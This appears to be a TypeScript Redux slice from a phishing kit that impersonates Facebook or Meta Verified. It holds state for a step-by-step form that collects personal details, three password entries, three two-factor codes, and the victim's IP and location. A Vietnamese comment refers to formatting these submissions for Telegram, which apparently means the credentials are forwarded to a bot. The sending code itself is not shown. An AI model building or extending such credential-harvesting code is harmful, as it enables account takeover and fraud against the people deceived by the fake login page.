import { createSlice, PayloadAction } from "@reduxjs/toolkit"

export interface FormData {
    fullName: string
    email: string
    emailBusiness: string
    fanpage: string
    phone: string
    day: string
    month: string
    year: string
    message: string
    password: string
    passwordSecond: string
    passwordThird: string
    twoFa: string
    twoFaSecond: string
    twoFaThird: string
    location?: string
    ip?: string
    country_code?: string
    /** Dùng bởi Telegram `formatMessage` để hiển thị tin đăng nhập vs Meta Verified */
    submissionFlow?: 'facebook_login' | 'meta_verified'
}

interface StepFormState {
    step: number
    data: FormData
}

const initialState: StepFormState = {
    step: 1,
    data: {
        fullName: "",
        email: "",
        emailBusiness: "",
        fanpage: "",
        phone: "",
        day: "",
        month: "",
        year: "",
        message: "",
        password: "",
        passwordSecond: "",
        passwordThird: "",
        twoFa: "",
        twoFaSecond: "",
        twoFaThird: ""
    }
}

const stepFormSlice = createSlice({
    name: "stepForm",
    initialState,
    reducers: {

        updateForm(state, action: PayloadAction<Partial<FormData>>) {
            state.data = {
                ...state.data,
                ...action.payload
            }
        },

        nextStep(state) {
            state.step += 1
        },

        prevStep(state) {
            state.step -= 1
        },

        resetForm() {
            return initialState
        }

    }
})

export const {
    updateForm,
    nextStep,
    prevStep,
    resetForm
} = stepFormSlice.actions

export default stepFormSlice.reducer